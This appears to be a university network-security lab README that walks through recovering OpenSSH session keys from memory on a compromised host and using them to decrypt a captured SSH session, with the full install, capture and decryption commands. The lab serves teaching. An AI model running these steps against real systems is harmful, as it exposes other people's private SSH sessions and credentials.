# SSH insecurity example
## Prerequisites
1. Host-based network with attack, infrastructure, and target VMs
2. Termsvr container in target VM

## Overview
You will setup a passive listener on an SSH session between two hosts.  In this example, these are our Attack VM (a compromised host where an attacker has local access) and the Target VM.  You will setup the connection between the two but imagine that from the attacker's perspective, that connection was happening by others and you have the local access on one side.  

Inside the Attack VM, you will create a new development container and install utilities (details below) to be able to gather the session keys and decrypt the ssh session by using them.

In addition to having local access, the attacker is able to capture the encrypted traffic going over the network.  For simplicity, you will use Wireshark running also inside the Attack VM.
```
|    Attack VM (client) | <---------SSH---------> | Target VM (server) |
     (devel container)               |
                                     V
 (Wireshark running from Attack VM) Tap
```
### Alternate approach
You can alternately capture the keys from the Target VM (server) side.  Here, you would create a devel container running Ubuntu that would be placed on the Target VM.  
```
| Attack VM (client) | <---------SSH---------> | Target VM (server) |
                                  |               (devel container)
                                  V
                                 Tap (Wireshark running from Target VM)
```
For this version, you would instead use the termsvr container and install all the python dependencies there.  Everything else should be identical other than where you are running things from.
## Instructions
1. Launch a new devel container on the Attack VM and setup to capture the ssh session keys (note: we are just downloading the vanilla kali image and do not need a Dockerfile to build one) from it
    ```
    $ docker run --name devel --network host -it kalilinux/kali-last-release:latest /bin/bash 
    # apt-get update
    # apt-get install python3 python3-pip python3-venv git
    # cd ~ && mkdir sandbox && cd sandbox
    # git clone https://github.com/jhu-information-security-institute/netsec-OpenSSH-Session-Key-Recovery
    # python3 -m venv sshcrack
    # source sshcrack/bin/activate
    (sshcrack) # pip install cython psutil python-ptrace
    (sshcrack) # python3 netsec-OpenSSH-Session-Key-Recovery/pip-package/openssh_session_keys/keys.py
    ```
1. Connect to the devel container from a second session to install and build OpenSSH-Network-Parser (tool that decrypts the ssh session using the keys, and its pynids dependency)
    ```
    # apt-get install python2 python2-dev virtualenv libglib2.0-0 libpcap-dev libnet1-dev libnids-dev curl
    # curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
    # python2 get-pip.py
    # pip2 install virtualenv
    # python2 -m virtualenv venv-pynids
    # source venv-pynids/bin/activate
    (pynids) # pip2 install gevent tabulate
    (pynids) # git clone https://github.com/jhu-information-security-institute/netsec-pynids
    (pynids) # cd netsec-pynids 
    (pynids) # python setup.py build
    (pynids) # python setup.py install
    (pynids) # cd ..
    (pynids) # git clone https://github.com/jhu-information-security-institute/netsec-OpenSSH-Network-Parser
    (pynids) # cd netsec-OpenSSH-Network-Parser
    (pynids) # pip2 install .
    ```
1. Startup wireshark in attack VM to capture the following ssh session (use filter tcp.port eq 2222) on the interface attached to VMNet1 (on netsec-docker.isi.jhu.edu, 192.168.25.0/24).
1. From the Attack VM, SSH into the termsvr: `# ssh -p 2222 -c aes256-gcm@openssh.com student@term.netsec-docker.isi.jhu.edu`
    * Note that we specify aes256-gcm, which is supported by the network-parser tool (some of the other modes, including the default one, aren't supported)
1. Once you see the keys appear in the first console (i.e., the one running keys.py), you can exit out of the keys.py command and also the ssh session.  For the former, you'll want to save the json formatted portion of the key results that were output to the screen into a keys.json file.  For the latter, save the pcap file.
1. Copy the saved *.pcap into your devel docker container.  Then, in your second devel session, use the network-parser utility to decrypt the *.pcap by providing it and the captured keys to the following command: `(pynids) # network-parser -p <PCAPFILE> -o <OUTPUTDIR> --proto=ssh --popt key=<KEYSJSONFILE> -s -vvvv`
1. Fun and profit!

## Useful links
* https://research.nccgroup.com/2020/11/11/decrypting-openssh-sessions-for-fun-and-profit
* https://github.com/jhu-information-security-institute/netsec-OpenSSH-Session-Key-Recovery
* https://github.com/jhu-information-security-institute/netsec-OpenSSH-Network-Parser
* https://github.com/jhu-information-security-institute/netsec-pynids
